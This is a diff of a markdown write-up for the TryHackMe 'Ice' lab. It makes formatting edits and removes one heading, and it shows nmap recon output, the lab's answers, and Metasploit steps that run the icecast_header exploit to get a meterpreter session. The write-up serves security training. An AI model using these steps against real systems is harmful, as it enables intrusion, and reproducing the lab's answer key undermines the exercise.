@@ -1,5 +1,4 @@
 # TryHackMe [Ice](https://www.tryhackme.com/room/ice)
-### References
 ## Recon
 ### Launch a scan against our target machine
 ```
@@ -27,18 +26,18 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 78.04 seconds
 ```
 ### What port is Microsoft Remote Desktop open on?
-**Answer** `3389`
+**Answer**: `3389`
 ### What service did nmap identify as running on port 8000?
-**Answer** `Icecast`
+**Answer**: `Icecast`
 ### What does Nmap identify as the hostname of the machine?
-**Answer** `DARK-PC`
+**Answer**: `DARK-PC`
 ## Gain Access
 ### What type of vulnerability is it (according to https://www.cvedetails.com)?
 * https://www.cvedetails.com/cve/CVE-2004-1561/
 
-**Answer** `Execute Code Overflow`
+**Answer**: `Execute Code Overflow`
 ### What is the CVE number for this vulnerability?
-**Answer** `CVE-2004-1561`
+**Answer**: `CVE-2004-1561`
 ### What is the full path (starting with exploit) for the Metasploit exploitation module?
 ```
 msf6 > search icecast
@@ -97,7 +96,7 @@ msf6 exploit(windows/http/icecast_header) > exploit
 
 meterpreter > sysinfo
 ```
-**Answer** `meterpreter`
+**Answer**: `meterpreter`
 ### What user was running that Icecast process?
 ```
 meterpreter > ps
